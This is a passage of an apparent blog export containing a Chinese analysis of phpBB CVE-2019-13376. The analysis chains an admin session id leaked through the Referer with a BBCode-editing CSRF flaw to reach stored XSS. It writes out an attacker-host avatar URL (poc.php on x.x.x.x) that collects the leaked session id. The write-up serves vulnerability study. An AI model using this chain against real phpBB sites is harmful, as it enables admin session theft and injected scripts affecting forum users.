这种形式，即语法左右用两个中括号包围，以作为与正常文字间的区别。系统解译时遇上中括号便知道该处是BBcode，会在解译结果输出到用户端时转换成最为通用的HTML语法。\n\n![285e9bb6f0740bb0c8f2c109500661ec.png](https://xzfile.aliyuncs.com/media/upload/picture/20200525170416-b63fa4d8-9e66-1.png)\n\n当然，作为后台管理功能，访问此处url也需要sid\n\n![d54b78b87df2e8186c7da1dd68b3b648.png](https://xzfile.aliyuncs.com/media/upload/picture/20200525170434-c06c87fa-9e66-1.png)\n\n由于上文的利用，攻击者可以获取sid，因此这里可以确定管理员此处后台功能的确切url\n\n在此页面上，管理员可以添加，删除和编辑自定义BBCode。假如定义了这样的BBCode\n\n![35e14edd5986fb0cf3cfd10f6dd58fa7.png](https://xzfile.aliyuncs.com/media/upload/picture/20200525170451-ca9e70da-9e66-1.png)\n\n用户可以在PM、话题或者帖子中使用这个BBCode\n\n![c08656b2ebd26a2aec703d2cc825b620.png](https://xzfile.aliyuncs.com/media/upload/picture/20200525170529-e1561742-9e66-1.png)\n\n结果如下\n\n![0e0de6e356c7d1d5390ad45804c3db75.png](https://xzfile.aliyuncs.com/media/upload/picture/20200525170548-eca11f8e-9e66-1.png)\n\n然而phpBB中编辑BBCode的功能存在CSRF问题，首先看一下编辑BBCode功能的后台代码\n\n![e3d599d122532f6b9197f6d1912be7fe.png](https://xzfile.aliyuncs.com/media/upload/picture/20200525170600-f3f10d9e-9e66-1.png)\n\n可以看到，这里的确有对csrf进行防范\n\n![45c2fe3f8d30a68f42780e666a1d9c07.png](https://xzfile.aliyuncs.com/media/upload/picture/20200525170614-fc17bd9c-9e66-1.png)\n\n但是问题出在了前面的\\$submit参数：\n\n![a64a118a0f84975f378f6b70a61c5915.png](https://xzfile.aliyuncs.com/media/upload/picture/20200525170626-035c9a1e-9e67-1.png)\n\n只有提交的POST请求中存在submit参数，系统才会检查CSRF nonce。反之不会\n\n因此，只要构造csrf时，请求中不带submit参数即可\n\n\\$action、\\$bbcode_id、\\$bbcode_match与\\$bbcode_tpl参数均有\\$request-\\>variable方式获取而来\n\n![b413f7d8cc4e07f361d7b53770f9aa29.png](https://xzfile.aliyuncs.com/media/upload/picture/20200525170647-0fb874c2-9e67-1.png)\n\n![81801c2f696b331b523458c65342d9c1.png](https://xzfile.aliyuncs.com/media/upload/picture/20200525170659-175321a0-9e67-1.png)\n\nvariable方法不仅会获取POST中提交的变量，也会获取通过GET提交的变量，这意味着攻击者可以通过GET参数传参来进行CSRF攻击。\n\n当csrf攻击成功后，恶意的bbcode将会被添加。之后攻击者可以滥用这个bbcode短代码，在消息、话题、帖子、回复中执行任意XSS代码。","source":"_posts/phpBB-CVE-2019-13376.md","raw":"---\ntitle: phpBB从session id泄露到CSRF到XSS（CVE-2019-13376）\ntags: web漏洞分析\ncategories: 技术\ncover: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/709d31dfe992849687470f94fd37242.jpg\ndate: 2020-06-03 17:24:45\ntop_img: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg\n---\n\n前言\n----\n\nphpBB是一个论坛软件，使用PHP语言开发的并开放其源码。是模块化设计，具专业性、安全性高、支持多国语系、支持多种数据库和自定义的版面设计等优越性能，而且功能强大。\n\n自2000年发布以来, phpBB已经成为世界上应用最广泛的开源论坛软件。\n\nphpBB 3.2.7版以及之前版本中存在一处安全问题：当管理员从phpBB后台控制面板切换到前台时，系统会将session id存放于访问的前台功能的URL中使得攻击者可以窃取这个session id。由于phpBB的安全限制，攻击者不可以直接利用这个sid登录后台，但是可以协同phpBB后台编辑bbcode页面存在的CSRF漏洞，在目标服务器上实现存储型XSS。\n\n漏洞分析\n--------\n\n首先来看一下phpBB的后台，也就是ACP页面\n\n![1fade44d81cf91aadbfee6e8b9b64375.png](https://xzfile.aliyuncs.com/media/upload/picture/20200525165909-ff3afa30-9e65-1.png)\n\n可以发现所有后台功能的url中都会携带着sid（session id）参数：\n\nhttp://127.0.0.1/phpbb/phpBB/adm/index.php?sid=9c4869b4054e9ff8d4d588c32ffcf7e7&i=1\n\n如果url中sid值错误，即使已经登录后台也无法正常的访问后台页面\n\nphpbb程序这样做的确有着这样做的优点，但也存在着很严重的安全隐患\n\n优点：\n\n在后台功能url中加入sid，相当于增加了一层安全屏障，降低了后台页面出现CSRF漏洞的几率，为什么这样说呢？假使因为开发疏忽，一个表单提交页面没有利用随机数对用户提交的表单进行保护，这通常会导致CSRF漏洞的产生。但是在phpbb应用中，所有的后台功能url中都加入了sid参数且phpbb对sid参数值合法性进行校验，即使攻击者在后台发现了一处没有随机数保护的表单提交页面，但在不知道管理\n\n员sid值的情况下，也无法构造出一个有效的恶意表单提交页面地址\n\n安全隐患：\n\n这样的操作相当于在url中存放了本来只应该出现在cookie中的session id。如果url中的sid被泄露，攻击者有机会利用这个值伪造管理员身份进行登录后台操作（但不一定可以直接利用，这里涉及到phpBB的一个安全机制，后文会讲到）。\n\n注意看，url中的sid值与cookie中的值完全一样，它们都是此用户的session id值\n\n![a727bbfd9e99d8af7ce92eb59df51530.png](https://xzfile.aliyuncs.com/media/upload/picture/20200525165935-0e36bae2-9e66-1.png)\n\n至于cookie中session值的key ：phpbb3_qnsnz_sid\n\n![310095afae1334c5a88e37b2006aea71.png](https://xzfile.aliyuncs.com/media/upload/picture/20200525165948-16066222-9e66-1.png)\n\n这个值在系统安装完成之后是固定的，无论什么身份的用户访问都是这个值\n\n因此，如果管理员访问的url中sid值被泄露，攻击者可以有机会利用这个值构造cookie以便使用管理员身份登录后台\n\n但是如何获取这个暴露在url中sid值呢?\n\n由于phpbb的设计特色：当管理员使用完后台功能后想要切换到前台，后台页面中提供了一个跳转到前台地址的按钮\n\n![e93afabea080285f472969e7ff95edca.png](https://xzfile.aliyuncs.com/media/upload/picture/20200525170004-1f97c952-9e66-1.png)\n\n当管理员点击这个按钮切换到前台时，url中会带有sid\n\n![4bb9c1259a5bffba9c5c7b0e08103f81.png](https://xzfile.aliyuncs.com/media/upload/picture/20200525170022-2a5eace8-9e66-1.png)\n\n其实前台页面的访问并不需要在url中使用sid，但从后台切换过来后url中会默认带上这个值。这就导致本应该只在后台功能url中出现的管理员sid泄露到了管理员访问的前台功能url中，而这个存在于url中的sid值很容易在前台页面加载远程资源时在HTTP_REFERER中被泄露\n\n例如：在一些phpbb站点中可能会开启远程头像选项\n\n![92ceab7d6b6ca8843b45bb2ac3c3d44c.png](https://xzfile.aliyuncs.com/media/upload/picture/20200525170036-3311fbe2-9e66-1.png)\n\n这个功能并不是默认开启的，当此功能开启后，用户可以设置远程头像\n\n![6c5e2ff9e8f384dd1467826dd185fa0b.png](https://xzfile.aliyuncs.com/media/upload/picture/20200525170049-3aa416c4-9e66-1.png)\n\n![f382c69315eb5f9220cd80cfdf5ac6ef.png](https://xzfile.aliyuncs.com/media/upload/picture/20200525170103-4306fa0c-9e66-1.png)\n\n程序会在使用这个远程头像的时候将其加载进来\n\n![aec8701acb8a37e80e276828058bf057.png](https://xzfile.aliyuncs.com/media/upload/picture/20200525170118-4beebc68-9e66-1.png)\n\n如果管理员此时访问的页面在渲染时加载了攻击者的远程头像，且此时管理员访问的url中带有sid，sid将会被泄露\n\n![44e1b0231b2d0466eb63be98864f1603.png](https://xzfile.aliyuncs.com/media/upload/picture/20200525170130-5342150a-9e66-1.png)\n\n我们是否可以构造一个恶意的远程图片链接poc，用以接收管理员的sid呢？\n\n首先看一下phpBB在后台程序如何校验远程图片链接，phpBB使用getImageSize对用户添加的远程图片链接进行校验\n\n![4b309cf7ce0df6e31d907c347010ba32.png](https://xzfile.aliyuncs.com/media/upload/picture/20200525170144-5b4ed396-9e66-1.png)\n\n因此我们可以构造如下poc\n\n![80de40f27885c454864e2d4b1886bd2f.png](https://xzfile.aliyuncs.com/media/upload/picture/20200525170205-67989128-9e66-1.png)\n\npoc.php除了需要记录加载该图片请求中的HTTP_REFERER，同时需要将图片进行返回展示\n\n![48634b633fb82765027d6f8930308591.png](https://xzfile.aliyuncs.com/media/upload/picture/20200525170224-72f8c43e-9e66-1.png)\n\n构造远程图片链接\n\nhttp://x.x.x.x/poc.php?avatar.png\n\n![8fa0e04de5df1cdda948464ae4cc350d.png](https://xzfile.aliyuncs.com/media/upload/picture/20200525170239-7c227532-9e66-1.png)\n\n攻击者的头像加载成功\n\n但是如何使得管理员加载这个头像资源呢？\n\n只要给管理员留言，或者评论管理员发布的文章即可\n\n以评论文章为例：当针对管理员发布的文章发表一条评论之后，管理员在前端页面即可收到一个消息提示\n\n![e1213eef63131716b7710bb5c4ce0392.png](https://xzfile.aliyuncs.com/media/upload/picture/20200525170253-84991da6-9e66-1.png)\n\n点看之后可以看到被加载的头像\n\n![8966297ebff91c3afdf6865cff15e346.png](https://xzfile.aliyuncs.com/media/upload/picture/20200525170305-8b5b0d20-9e66-1.png)\n\n但无论管理员点开与否，在phpbb首页加载时，都会远程加载这个资源，HTTP_REFERER都会被发送到攻击者的服务器上\n\n![e321b34e590a226b8abd3aa1b8262f9c.png](https://xzfile.aliyuncs.com/media/upload/picture/20200525170318-93a33b88-9e66-1.png)\n\n![946f0ef1b05ee18165001d78fcd5a886.png](https://xzfile.aliyuncs.com/media/upload/picture/20200525170334-9ca75af2-9e66-1.png)\n\n到此为止，攻击者可以顺利获得sid值。但为什么上文说获取了sid值也不一定可以盗用管理员身份登录系统呢？\n\n在phpBB中有如下的安全策略\n\n![e661d57f2a320a6b09176dfd1f3d8dc0.png](https://xzfile.aliyuncs.com/media/upload/picture/20200525170348-a57abc82-9e66-1.png)\n\nSession IP validation选项用来验证当前用户会话绑定的IP；All选项代表匹配完整地址，A.B.C选项匹配前面的x.x.x段，A.B选项匹配x.x，None选项关闭IP检查。\n\n这项安全策略是用来检验用户sid与IP的绑定关系，系统默认采用A.B.C选项，因此攻击者在获取了管理员sid后，想要冒用身份也是很困难的。\n\n然而这也不是无解的：\n\nphpBB后台管理中包含着编辑BBCode的功能。\n\nBBCode是Bulletin Board Code的缩写，也有译为「BB代码」的，属于轻量标记语言（Lightweight Markup Language）的一种，如字面上所显示的，它主要是使用在BBS、论坛、Blog等网络应用上。BBcode的语法通常为 [标记] 这种形式，即语法左右用两个中括号包围，以作为与正常文字间的区别。系统解译时遇上中括号便知道该处是BBcode，会在解译结果输出到用户端时转换成最为通用的HTML语法。\n\n![285e9bb6f0740bb0c8f2c109500661ec.png](https://xzfile.aliyuncs.com/media/upload/picture/20200525170416-b63fa4d8-9e66-1.png)\n\n当然，作为后台管理功能，访问此处url也需要sid\n\n![d54b78b87df2e8186c7da1dd68b3b648.png](https://xzfile.aliyuncs.com/media/upload/picture/20200525170434-c06c87fa-9e66-1.png)\n\n由于上文的利用，攻击者可以获取sid，因此这里可以确定管理员此处后台功能的确切url\n\n在此页面上，管理员可以添加，删除和编辑自定义BBCode。假如定义了这样的BBCode\n\n![35e14edd5986fb0cf3cfd10f6dd58fa7.png](https://xzfile.aliyuncs.com/media/upload/picture/20200525170451-ca9e70da-9e66-1.png)\n\n用户可以在PM、话题或者帖子中使用这个BBCode\n\n![c08656b2ebd26a2aec703d2cc825b620.png](https://xzfile.aliyuncs.com/media/upload/picture/20200525170529-e1561742-9e66-1.png)\n\n结果如下\n\n![0e0de6e356c7d1d5390ad45804c3db75.png](https://xzfile.aliyuncs.com/media/upload/picture/20200525170548-eca11f8e-9e66-1.png)\n\n然而phpBB中编辑BBCode的功能存在CSRF问题，首先看一下编辑BBCode功能的后台代码\n\n![e3d599d122532f6b9197f6d1912be7fe.png](https://xzfile.aliyuncs.com/media/upload/picture/20200525170600-f3f10d9e-9e66-1.png)\n\n可以看到，这里的确有对csrf进行防范\n\n![45c2fe3f8d30a68f42780e666a1d9c07.png](https://xzfile.aliyuncs.com/media/upload/picture/20200525170614-fc17bd9c-9e66-1.png)\n\n但是问题出在了前面的\\$submit参数：\n\n![a64a118a0f84975f378f6b70a61c5915.png](https://xzfile.aliyuncs.com/media/upload/picture/20200525170626-035c9a1e-9e67-1.png)\n\n只有提交的POST请求中存在submit参数，系统才会检查CSRF nonce。反之不会\n\n因此，只要构造csrf时，请求中不带submit参数即可\n\n\\$action、\\$bbcode_id、\\$bbcode_match与\\$bbcode_tpl参数均有\\$request-\\>variable方式获取而来\n\n![b413f7d8cc4e07f361d7b53770f9aa29.png](https://xzfile.aliyuncs.com/media/upload/picture/20200525170647-0fb874c2-9e67-1.png)\n\n![81801c2f696b331b523458c65342d9c1.png](https://xzfile.aliyuncs.com/media/upload/picture/20200525170659-175321a0-9e67-1.png)\n\nvariable方法不仅会获取POST中提交的变量，也会获取通过GET提交的变量，这意味着攻击者可以通过GET参数传参来进行CSRF攻击。\n\n当csrf攻击成功后，恶意的bbcode将会被添加。之后攻击者可以滥用这个bbcode短代码，在消息、话题、帖子、回复中执行任意XSS代码。","slug":"phpBB-CVE-2019-13376","published":1,"updated":"2020-10-27T09:25:29.571Z","_id":"ckgrozu9q0045wsa9a6o85my3","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>phpBB是一个论坛软件，使用PHP语言开发的并开放其源码。是模块化设计，具专业性、安全性高、支持多国语系、支持多种数据库和自定义的版面设计等优越性能，而且功能强大。</p>\n<p>自2000年发布以来, phpBB已经成为世界上应用最广泛的开源论坛软件。</p>\n<p>phpBB 3.2.7版以及之前版本中存在一处安全问题：当管理员从phpBB后台控制面板切换到前台时，系统会将session id存放于访问的前台功能的URL中使得攻击者可以窃取这个session id。由于phpBB的安全限制，攻击者不可以直接利用这个sid登录后台，但是可以协同phpBB后台编辑bbcode页面存在的CSRF漏洞，在目标服务器上实现存储型XSS。</p>\n<h2 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h2><p>首先来看一下phpBB的后台，也就是ACP页面</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200525165909-ff3afa30-9e65-1.png\" alt=\"1fade44d81cf91aadbfee6e8b9b64375.png\"></p>\n<p>可以发现所有后台功能的url中都会携带着sid（session id）参数：</p>\n<p><a href=\"http://127.0.0.1/phpbb/phpBB/adm/index.php?sid=9c4869b4054e9ff8d4d588c32ffcf7e7&amp;i=1\">http://127.0.0.1/phpbb/phpBB/adm/index.php?sid=9c4869b4054e9ff8d4d588c32ffcf7e7&amp;i=1</a></p>\n<p>如果url中sid值错误，即使已经登录后台也无法正常的访问后台页面</p>\n<p>phpbb程序这样做的确有着这样做的优点，但也存在着很严重的安全隐患</p>\n<p>优点：</p>\n<p>在后台功能url中加入sid，相当于增加了一层安全屏障，降低了后台页面出现CSRF漏洞的几率，为什么这样说呢？假使因为开发疏忽，一个表单提交页面没有利用随机数对用户提交的表单进行保护，这通常会导致CSRF漏洞的产生。但是在phpbb应用中，所有的后台功能url中都加入了sid参数且phpbb对sid参数值合法性进行校验，即使攻击者在后台发现了一处没有随机数保护的表单提交页面，但在不知道管理</p>\n<p>员sid值的情况下，也无法构造出一个有效的恶意表单提交页面地址</p>\n<p>安全隐患：</p>\n<p>这样的操作相当于在url中存放了本来只应该出现在cookie中的session id。如果url中的sid被泄露，攻击者有机会利用这个值伪造管理员身份进行登录后台操作（但不一定可以直接利用，这里涉及到phpBB的一个安全机制，后文会讲到）。</p>\n<p>注意看，url中的sid值与cookie中的值完全一样，它们都是此用户的session id值</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200525165935-0e36bae2-9e66-1.png\" alt=\"a727bbfd9e99d8af7ce92eb59df51530.png\"></p>\n<p>至于cookie中session值的key ：phpbb3_qnsnz_sid</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200525165948-16066222-9e66-1.png\" alt=\"310095afae1334c5a88e37b2006aea71.png\"></p>\n<p>这个值在系统安装完成之后是固定的，无论什么身份的用户访问都是这个值</p>\n<p>因此，如果管理员访问的url中sid值被泄露，攻击者可以有机会利用这个值构造cookie以便使用管理员身份登录后台</p>\n<p>但是如何获取这个暴露在url中sid值呢?</p>\n<p>由于phpbb的设计特色：当管理员使用完后台功能后想要切换到前台，后台页面中提供了一个跳转到前台地址的按钮</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200525170004-1f97c952-9e66-1.png\" alt=\"e93afabea080285f472969e7ff95edca.png\"></p>\n<p>当管理员点击这个按钮切换到前台时，url中会带有sid</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200525170022-2a5eace8-9e66-1.png\" alt=\"4bb9c1259a5bffba9c5c7b0e08103f81.png\"></p>\n<p>其实前台页面的访问并不需要在url中使用sid，但从后台切换过来后url中会默认带上这个值。这就导致本应该只在后台功能url中出现的管理员sid泄露到了管理员访问的前台功能url中，而这个存在于url中的sid值很容易在前台页面加载远程资源时在HTTP_REFERER中被泄露</p>\n<p>例如：在一些phpbb站点中可能会开启远程头像选项</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200525170036-3311fbe2-9e66-1.png\" alt=\"92ceab7d6b6ca8843b45bb2ac3c3d44c.png\"></p>\n<p>这个功能并不是默认开启的，当此功能开启后，用户可以设置远程头像</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200525170049-3aa416c4-9e66-1.png\" alt=\"6c5e2ff9e8f384dd1467826dd185fa0b.png\"></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200525170103-4306fa0c-9e66-1.png\" alt=\"f382c69315eb5f9220cd80cfdf5ac6ef.png\"></p>\n<p>程序会在使用这个远程头像的时候将其加载进来</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200525170118-4beebc68-9e66-1.png\" alt=\"aec8701acb8a37e80e276828058bf057.png\"></p>\n<p>如果管理员此时访问的页面在渲染时加载了攻击者的远程头像，且此时管理员访问的url中带有sid，sid将会被泄露</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200525170130-5342150a-9e66-1.png\" alt=\"44e1b0231b2d0466eb63be98864f1603.png\"></p>\n<p>我们是否可以构造一个恶意的远程图片链接poc，用以接收管理员的sid呢？</p>\n<p>首先看一下phpBB在后台程序如何校验远程图片链接，phpBB使用getImageSize对用户添加的远程图片链接进行校验</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200525170144-5b4ed396-9e66-1.png\" alt=\"4b309cf7ce0df6e31d907c347010ba32.png\"></p>\n<p>因此我们可以构造如下poc</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200525170205-67989128-9e66-1.png\" alt=\"80de40f27885c454864e2d4b1886bd2f.png\"></p>\n<p>poc.php除了需要记录加载该图片请求中的HTTP_REFERER，同时需要将图片进行返回展示</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200525170224-72f8c43e-9e66-1.png\" alt=\"48634b633fb82765027d6f8930308591.png\"></p>\n<p>构造远程图片链接</p>\n<p><a href=\"http://x.x.x.x/poc.php?avatar.png\">http://x.x.x.x/poc.php?avatar.png</a></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200525170239-7c227532-9e66-1.png\" alt=\"8fa0e04de5df1cdda948464ae4cc350d.png\"></p>\n<p>攻击者的头像加载成功</p>\n<p>但是如何使得管理员加载这个头像资源呢？</p>\n<p>只要给管理员留言，或者评论管理员发布的文章即可</p>\n<p>以评论文章为例：当针对管理员发布的文章发表一条评论之后，管理员在前端页面即可收到一个消息提示</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200525170253-84991da6-9e66-1.png\" alt=\"e1213eef63131716b7710bb5c4ce0392.png\"></p>\n<p>点看之后可以看到被加载的头像</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200525170305-8b5b0d20-9e66-1.png\" alt=\"8966297ebff91c3afdf6865cff15e346.png\"></p>\n<p>但无论管理员点开与否，在phpbb首页加载时，都会远程加载这个资源，HTTP_REFERER都会被发送到攻击者的服务器上</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200525170318-93a33b88-9e66-1.png\" alt=\"e321b34e590a226b8abd3aa1b8262f9c.png\"></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200525170334-9ca75af2-9e66-1.png\" alt=\"946f0ef1b05ee18165001d78fcd5a886.png\"></p>\n<p>到此为止，攻击者可以顺利获得sid值。但为什么上文说获取了sid值也不一定可以盗用管理员身份登录系统呢？</p>\n<p>在phpBB中有如下的安全策略</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200525170348-a57abc82-9e66-1.png\" alt=\"e661d57f2a320a6b09176dfd1f3d8dc0.png\"></p>\n<p>Session IP validation选项用来验证当前用户会话绑定的IP；All选项代表匹配完整地址，A.B.C选项匹配前面的x.x.x段，A.B选项匹配x.x，None选项关闭IP检查。</p>\n<p>这项安全策略是用来检验用户sid与IP的绑定关系，系统默认采用A.B.C选项，因此攻击者在获取了管理员sid后，想要冒用身份也是很困难的。</p>\n<p>然而这也不是无解的：</p>\n<p>phpBB后台管理中包含着编辑BBCode的功能。</p>\n<p>BBCode是Bulletin Board Code的缩写，也有译为「BB代码」的，属于轻量标记语言（Lightweight Markup Language）的一种，如字面上所显示的，它主要是使用在BBS、论坛、Blog等网络应用上。BBcode的语法通常为 [标记] 这种形式，即语法左右用两个中括号包围，以作为与正常文字间的区别。系统解译时遇上中括号便知道该处是BBcode，会在解译结果输出到用户端时转换成最为通用的HTML语法。</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200525170416-b63fa4d8-9e66-1.png\" alt=\"285e9bb6f0740bb0c8f2c109500661ec.png\"></p>\n<p>当然，作为后台管理功能，访问此处url也需要sid</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200525170434-c06c87fa-9e66-1.png\" alt=\"d54b78b87df2e8186c7da1dd68b3b648.png\"></p>\n<p>由于上文的利用，攻击者可以获取sid，因此这里可以确定管理员此处后台功能的确切url</p>\n<p>在此页面上，管理员可以添加，删除和编辑自定义BBCode。假如定义了这样的BBCode</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200525170451-ca9e70da-9e66-1.png\" alt=\"35e14edd5986fb0cf3cfd10f6dd58fa7.png\"></p>\n<p>用户可以在PM、话题或者帖子中使用这个BBCode</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200525170529-e1561742-9e66-1.png\" alt=\"c08656b2ebd26a2aec703d2cc825b620.png\"></p>\n<p>结果如下</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200525170548-eca11f8e-9e66-1.png\" alt=\"0e0de6e356c7d1d5390ad45804c3db75.png\"></p>\n<p>然而phpBB中编辑BBCode的功能存在CSRF问题，首先看一下编辑BBCode功能的后台代码</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200525170600-f3f10d9e-9e66-1.png\" alt=\"e3d599d122532f6b9197f6d1912be7fe.png\"></p>\n<p>可以看到，这里的确有对csrf进行防范</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200525170614-fc17bd9c-9e66-1.png\" alt=\"45c2fe3f8d30a68f42780e666a1d9c07.png\"></p>\n<p>但是问题出在了前面的$submit参数：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200525170626-035c9a1e-9e67-1.png\" alt=\"a64a118a0f84975f378f6b70a61c5915.png\"></p>\n<p>只有提交的POST请求中存在submit参数，系统才会检查CSRF nonce。反之不会</p>\n<p>因此，只要构造csrf时，请求中不带submit参数即可</p>\n<p>$action、$bbcode_id、$bbcode_match与$bbcode_tpl参数均有$request-&gt;variable方式获取而来</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200525170647-0fb874c2-9e67-1.png\" alt=\"b413f7d8cc4e07f361d7b53770f9aa29.png\"></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200525170659-175321a0-9e67-1.png\" alt=\"81801c2f696b331b523458c65342d9c1.png\"></p>\n<p>variable方法不仅会获取POST中提交的变量，也会获取通过GET提交的变量，这意味着攻击者可以通过GET参数传参来进行CSRF攻击。</p>\n<p>当csrf攻击成功后，恶意的bbcode将会被添加。之后攻击者可以滥用这个bbcode短代码，在消息、话题、帖子、回复中执行任意XSS代码。</p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"excerpt":"","more":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>phpBB是一个论坛软件，使用PHP语言开发的并开放其源码。是模块化设计，具专业性、安全性高、支持多国语系、支持多种数据库和自定义的版面设计等优越性能，而且功能强大。</p>\n<p>自2000年发布以来, phpBB已经成为世界上应用最广泛的开源论坛软件。</p>\n<p>phpBB 3.2.7版以及之前版本中存在一处安全问题：当管理员从phpBB后台控制面板切换到前台时，系统会将session id存放于访问的前台功能的URL中使得攻击者可以窃取这个session id。由于phpBB的安全限制，攻击者不可以直接利用这个sid登录后台，但是可以协同phpBB后台编辑bbcode页面存在的CSRF漏洞，在目标服务器上实现存储型XSS。</p>\n<h2 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h2><p>首先来看一下phpBB的后台，也就是ACP页面</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200525165909-ff3afa30-9e65-1.png\" alt=\"1fade44d81cf91aadbfee6e8b9b64375.png\"></p>\n<p>可以发现所有后台功能的url中都会携带着sid（session id）参数：</p>\n<p><a href=\"http://127.0.0.1/phpbb/phpBB/adm/index.php?sid=9c4869b4054e9ff8d4d588c32ffcf7e7&amp;i=1\">http://127.0.0.1/phpbb/phpBB/adm/index.php?sid=9c4869b4054e9ff8d4d588c32ffcf7e7&amp;i=1</a></p>\n<p>如果url中sid值错误，即使已经登录后台也无法正常的访问后台页面</p>\n<p>phpbb程序这样做的确有着这样做的优点，但也存在着很严重的安全隐患</p>\n<p>优点：</p>\n<p>在后台功能url中加入sid，相当于增加了一层安全屏障，降低了后台页面出现CSRF漏洞的几率，为什么这样说呢？假使因为开发疏忽，一个表单提交页面没有利用随机数对用户提交的表单进行保护，这通常会导致CSRF漏洞的产生。但是在phpbb应用中，所有的后台功能url中都加入了sid参数且phpbb对sid参数值合法性进行校验，即使攻击者在后台发现了一处没有随机数保护的表单提交页面，但在不知道管理</p>\n<p>员sid值的情况下，也无法构造出一个有效的恶意表单提交页面地址</p>\n<p>安全隐患：</p>\n<p>这样的操作相当于在url中存放了本来只应该出现在cookie中的session id。如果url中的sid被泄露，攻击者有机会利用这个值伪造管理员身份进行登录后台操作（但不一定可以直接利用，这里涉及到phpBB的一个安全机制，后文会讲到）。</p>\n<p>注意看，url中的sid值与cookie中的值完全一样，它们都是此用户的session id值</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200525165935-0e36bae2-9e66-1.png\" alt=\"a727bbfd9e99d8af7ce92eb59df51530.png\"></p>\n<p>至于cookie中session值的key ：phpbb3_qnsnz_sid</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200525165948-16066222-9e66-1.png\" 